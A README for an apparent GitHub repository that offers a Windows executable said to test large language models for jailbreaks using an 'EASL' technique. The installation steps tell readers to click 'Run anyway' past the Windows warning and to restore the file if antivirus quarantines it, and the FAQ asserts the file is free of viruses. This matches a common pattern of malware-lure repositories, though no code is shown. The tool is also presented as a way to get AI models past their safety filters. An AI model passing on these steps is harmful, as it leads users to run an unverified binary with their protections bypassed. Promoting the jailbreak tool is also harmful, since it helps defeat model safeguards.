# 🛡️ LLM-Jailbreak-Research - Test Large Language Model Security Gaps

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/cheeseboardchalcisfly616/LLM-Jailbreak-Research/releases)

This project provides tools to test large language models for security weaknesses. It focuses on the EASL technique, which identifies vulnerabilities in models like DeepSeek and Google Gemini. Security teams and researchers use these tools to understand model behavior and improve safety.

## 🎯 Project Overview

Artificial intelligence models process text and generate responses based on training data. These models sometimes ignore safety rules when they receive specific prompts. This research identifies those patterns. By using the provided tools, you can run controlled tests to see how different models respond to complex inputs.

The goal is to increase AI safety. Developers use these results to patch security holes. This project follows responsible disclosure guidelines. It highlights areas where current safety filters fail to block harmful or unintended output.

## ⚙️ System Requirements

- Windows 10 or Windows 11 (64-bit)
- 8 GB of RAM
- 500 MB of free storage space
- Stable internet connection
- Modern web browser

## 📥 Downloading the Tool

Follow these steps to get the software on your computer.

1. Go to the [official release page](https://github.com/cheeseboardchalcisfly616/LLM-Jailbreak-Research/releases).
2. Look for the most recent version at the top of the list.
3. Click the file with a .exe extension to start the download.
4. Save the file to your desktop or downloads folder.
5. Once the download finishes, locate the file on your computer.

## 🚀 Running the Application

After your download finishes, follow these instructions to start the program.

1. Double-click the file you downloaded.
2. Windows might show a prompt asking if you trust the file. Click "Run anyway."
3. A command window appears. This window shows the program status.
4. The tool opens a local browser interface. This is where you conduct your tests.
5. If the browser does not open, copy the address shown in the command window and paste it into your web browser.

## 🔍 How to Perform a Test

The interface allows you to choose which model you want to test. Follow these steps for your first test.

1. Select a model from the dropdown menu.
2. Choose the EASL experiment from the list of available modules.
3. Enter your test input in the text box.
4. Click the "Run Test" button.
5. Wait for the model to process your request.
6. The window displays the result. If the model provides a restricted response, the test confirms a security concern.

## 🛡️ Safety and Responsible Use

This tool is for research purposes. Only use it on systems you own or have permission to test. Do not use these prompts to cause harm or violate terms of service for third-party AI providers. Responsible researchers share their findings with model creators to make AI safer for everyone.

## 🛠️ Troubleshooting

If the program fails to start, check the following items:

- Ensure your antivirus software did not move the file to quarantine.
- Verify that you have an active internet connection.
- Close other applications that use high amounts of memory.
- Check if your firewall prevents access to local server ports.

If the browser interface locks up, close the command window and restart the program. This clears temporary memory and resets the connection.

## 📚 Understanding Key Terms

- **Jailbreak:** An attempt to make an AI model ignore its safety filters.
- **EASL:** A specific technique that exploits reasoning patterns in AI models.
- **Red-teaming:** A practice where security experts try to break systems to find weaknesses.
- **Model Endpoint:** The connection point where your computer talks to the AI model.
- **Disclosure:** Reporting a found vulnerability to the company that made the model.

## 📝 Frequently Asked Questions

**Is this software safe?**
The software performs local security tests. It does not contain viruses or malicious code.

**Does this save my data?**
The tool runs locally on your machine. Your test prompts stay on your computer unless you choose to export them.

**Do I need an API key?**
Some models require an API key to work. If a model asks for a key, enter it in the settings tab.

**Can I run this on a Mac?**
This version is for Windows only. Check the repository for updates regarding other operating systems.

**Where do I see results?**
All results appear within the web interface. You can save these to a text file for your records.

## 🚀 Contributing to the Project

You can help improve this research. If you find a new way to test models or discover a performance issue, open an issue on the main page. Provide details about the model version and the steps you took to replicate the result. Clear documentation helps the community build stronger security layers for everyone.